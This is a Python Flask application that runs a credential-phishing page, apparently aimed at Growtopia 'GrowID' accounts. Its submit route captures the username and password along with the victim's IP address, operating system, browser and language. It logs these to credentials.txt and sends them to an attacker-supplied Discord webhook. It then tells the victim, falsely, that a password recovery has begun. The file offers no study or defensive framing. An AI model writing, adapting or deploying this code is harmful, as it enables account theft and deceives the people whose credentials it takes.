from flask import Flask, render_template, request
from discord_webhook import DiscordWebhook
from user_agents import parse

app = Flask(__name__)

@app.route("/")
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        growid = request.form['name']
        password = request.form['password']

        ip = request.remote_addr
        user_agent_string = request.headers.get('User-Agent', '')

        user_agent = parse(user_agent_string)

        os = user_agent.os.family
        os_version = user_agent.os.version_string
        if os_version:
            os_version = f" {os_version}"
            browser = user_agent.browser.family
            browser_version = user_agent.browser.version_string

        accept_language = request.headers.get('Accept-Language', '')
        languages = [lang.split(';')[0] for lang in accept_language.split(',')]
        language = ', '.join(languages)
        
        # Saves to file
        with open('credentials.txt', 'a') as file:
            file.write(f"GrowID: {growid}, Password: {password}, IP: {ip}, OS: {os}{os_version}, Browser: {browser} {browser_version}, Language: {language}\n")

        # Sends to webhook
        response = send_message_webhook(url=webhook_url, username=ip, content=f"``GrowID: {growid}, Password: {password}\nIP: {ip}, OS: {os}{os_version}\nBrowser: {browser} {browser_version}, Language: {language}``")
        
        # Return user a message
        return f"Your password recovery request has been sent! The process will be started shortly. Response code: {response.status_code}"

def send_message_webhook(url, content, username=None, proxy=None):
        webhook = DiscordWebhook(
            url=url,
            content=content,
            username=username,
            proxy=proxy,
            rate_limit_retry=True,
        )
        response = webhook.execute()
        return response

if __name__ == '__main__':
    webhook_url = input("Webhook URL: ")
    app.run()
